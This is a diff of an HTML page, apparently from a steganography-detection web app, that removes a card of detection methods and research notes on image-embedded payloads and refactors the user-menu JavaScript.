-                  <h5><i class="bi bi-graph-up"></i> Statistical Analysis</h5>
-                  <ul style="color: var(--text-primary);">
-                    <li>LSB distribution analysis</li>
-                    <li>Chi-square testing</li>
-                    <li>Pattern recognition</li>
-                    <li>Anomaly detection</li>
-                  </ul>
-                </div>
-              </div>
-              <div class="col-md-6">
-                <div class="tech-detail">
-                  <h5><i class="bi bi-tools"></i> Automated Tools</h5>
-                  <ul style="color: var(--text-primary);">
-                    <li>Use VigilantEye for comprehensive scanning</li>
-                    <li>Deploy steganalysis tools</li>
-                    <li>Implement ML-based detection</li>
-                    <li>Regular security audits</li>
-                  </ul>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <!-- Research References -->
-        <div class="card mb-4" style="background: var(--bg-card); border: 1px solid var(--border-color);">
-          <div class="card-body p-4">
-            <h3 class="mb-4" style="color: var(--primary-color);">
-              <i class="bi bi-journal-text"></i> Research References & Academic Sources
-            </h3>
-            <div class="tech-detail">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-book"></i> Key Research Findings
-              </h5>
-              <ul style="color: var(--text-primary); line-height: 1.8;">
-                <li><strong>File Format Execution Limitations:</strong> Research in file format security demonstrates that image formats (GIF, JPEG, PNG) cannot execute code natively. Execution requires external interpreters or vulnerable applications.</li>
-                <li><strong>Steganography in Image Files:</strong> Academic studies show that while steganography can hide data in images, the hidden data remains passive until extracted and executed by external means.</li>
-                <li><strong>Polyglot File Attacks:</strong> Security research identifies that true execution threats come from polyglot files (files valid as multiple formats) executed as executables, not as images.</li>
-                <li><strong>Application Vulnerabilities:</strong> Studies show that GIF-embedded malware exploits vulnerabilities in file processing applications, not the GIF format itself.</li>
-                <li><strong>Detection vs. Execution:</strong> Research emphasizes that detection focuses on identifying embedded payloads, while prevention focuses on secure file handling and application security.</li>
-              </ul>
-            </div>
-            <div class="tech-detail mt-3">
-              <h5 style="color: var(--text-primary); margin-bottom: 1rem;">
-                <i class="bi bi-file-earmark-text"></i> Related Security Concepts
-              </h5>
-              <ul style="color: var(--text-primary); line-height: 1.8;">
-                <li><strong>File Upload Vulnerabilities:</strong> OWASP Top 10 - Insecure File Upload vulnerabilities enable execution of embedded payloads.</li>
-                <li><strong>Code Injection:</strong> Embedded code requires injection points in applications to execute (e.g., eval(), system(), exec()).</li>
-                <li><strong>Social Engineering:</strong> User-initiated execution through social engineering is a common attack vector for embedded payloads.</li>
-                <li><strong>Defense in Depth:</strong> Multiple security layers (file validation, content scanning, sandboxing) prevent execution even if payloads are embedded.</li>
-              </ul>
-            </div>
-          </div>
-        </div>
-
         <!-- Footer Actions -->
         <div class="text-center mt-5">
           <a href="{{ url_for('embed_demo') }}" class="btn btn-primary me-2">
@@ -742,30 +301,36 @@ Hidden in 3 pixels:
 </div>
 
 <script>
-  // User Menu Toggle
-  function toggleUserMenu() {
-    const dropdown = document.getElementById('userDropdown');
-    const btn = document.getElementById('userMenuBtn');
-    
-    if (dropdown && btn) {
-      dropdown.classList.toggle('show');
-      btn.classList.toggle('active');
+  document.addEventListener('DOMContentLoaded', function() {
+    function toggleUserMenu() {
+      const dropdown = document.getElementById('userDropdown');
+      const btn = document.getElementById('userMenuBtn');
+      if (dropdown && btn) {
+        dropdown.classList.toggle('show');
+        btn.classList.toggle('active');
+      }
     }
-  }
+    
+    const userMenuBtn = document.getElementById('userMenuBtn');
+    if (userMenuBtn) {
+      userMenuBtn.addEventListener('click', toggleUserMenu);
+    }
 
-  // Close user menu when clicking outside
-  document.addEventListener('click', function(event) {
-    const userMenu = document.querySelector('.user-menu');
-    const dropdown = document.getElementById('userDropdown');
-    const btn = document.getElementById('userMenuBtn');
-    
-    if (userMenu && dropdown && btn && !userMenu.contains(event.target)) {
-      dropdown.classList.remove('show');
-      btn.classList.remove('active');
-    }
+    let clickTimeout;
+    document.addEventListener('click', function(event) {
+      clearTimeout(clickTimeout);
+      clickTimeout = setTimeout(function() {
+        const userMenu = document.querySelector('.user-menu');
+        const dropdown = document.getElementById('userDropdown');
+        const btn = document.getElementById('userMenuBtn');
+        if (userMenu && dropdown && btn && !userMenu.contains(event.target)) {
+          dropdown.classList.remove('show');
+          btn.classList.remove('active');
+        }
+      }, 10);
+    }, { passive: true });
   });
 </script>
 
 </body>
 </html>
-
